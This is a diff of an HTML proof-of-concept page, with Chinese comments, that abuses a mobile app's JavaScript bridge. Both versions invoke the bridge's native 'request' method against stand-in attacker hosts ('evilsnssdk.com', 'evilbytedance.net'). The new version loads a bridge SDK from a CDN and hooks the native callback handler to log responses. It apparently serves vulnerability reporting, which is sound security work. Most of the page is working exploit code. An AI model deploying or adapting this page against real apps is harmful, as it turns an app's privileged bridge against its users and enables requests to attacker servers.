@@ -1,38 +1,63 @@
 <!DOCTYPE html>
-<html>
+<html lang="zh-cn">
+<head>
+<meta charset="utf-8">
+<title>JSB PoC - JSSDK</title>
+<meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no">
+</head>
 <body>
-<div id="status">页面加载中...</div>
-<div id="response"></div>
+<h2>JSB PoC (using JSSDK + request)</h2>
+<pre id="log" style="font-size:11px;white-space:pre-wrap;word-break:break-all;">loading JSSDK...</pre>
+
+<!-- 加载和工单一样的 JSSDK -->
+<script src="//cdn-tos-cn.bytedance.net/obj/archi/security/jsb/automation/web/static/jsbridge/bytedance-jsbridge.umd.js"></script>
 
 <script>
-// 1. 确认页面加载
-document.getElementById('status').innerHTML = '✅ 页面已加载';
-
-// 2. 诊断信息
-var info = [
-    'URL: ' + window.location.href,
-    'UA: ' + navigator.userAgent,
-    'JSBridge: ' + typeof window.JSBridge,
-    'TTJSBridge: ' + typeof window.TTJSBridge,
-    'Bridge 相关对象: ' + Object.keys(window).filter(k => /bridge|jsb/i.test(k)).join(', ')
-];
-document.getElementById('response').innerHTML = info.join('<br><br>');
-
-// 3. 等待并调用
-function tryCall() {
-    var bridge = window.JSBridge || window.TTJSBridge;
-    if (bridge && typeof bridge.call === 'function') {
-        bridge.call('request', {
-            url: 'https://evilsnssdk.com/jsb_test/33eca3a2f55edf4c712978f44c9bbf19/1/177041520205822863',
-            method: 'GET'
-        }, function(res) {
-            document.getElementById('response').innerHTML = 
-                '<pre>' + JSON.stringify(res, null, 2) + '</pre>';
-        });
-    } else {
-        setTimeout(tryCall, 500);
-    }
+function log(msg) {
+  var el = document.getElementById('log');
+  el.innerText += '\n' + msg;
+  el.scrollTop = el.scrollHeight;
 }
+
+function safeStr(obj) {
+  if (obj === null || obj === undefined) return String(obj);
+  if (typeof obj === 'string') return obj;
+  try { return JSON.stringify(obj); } catch(e) { return String(obj); }
+}
+
+// 监听 Native 回调（底层）
+if (typeof JS2NativeBridge !== 'undefined') {
+  var orig = JS2NativeBridge._handleMessageFromApp;
+  JS2NativeBridge._handleMessageFromApp = function(msg) {
+    log('[Native CB] ' + safeStr(msg));
+    if (typeof orig === 'function') { try { orig(msg); } catch(e) {} }
+  };
+}
+
+function tryCall() {
+  // 检查 JSSDK 是否加载完成
+  if (typeof window.JSBridge === 'undefined' || typeof window.JSBridge.call !== 'function') {
+    log('JSBridge not ready, retrying...');
+    setTimeout(tryCall, 500);
+    return;
+  }
+
+  log('========================================');
+  log('JSBridge ready! Calling request...');
+  log('========================================');
+
+  // 和工单一样的调用方式
+  window.JSBridge.call('request', {
+    url: 'https://evilbytedance.net:443/poc.html',
+    method: 'GET'
+  }, function(res) {
+    log('[JSBridge Callback] ' + safeStr(res));
+  });
+
+  log('[*] Call sent. Watch server terminal for /jsb_test/poc request.');
+}
+
+// 等待 JSSDK 加载
 setTimeout(tryCall, 1000);
 </script>
 </body>
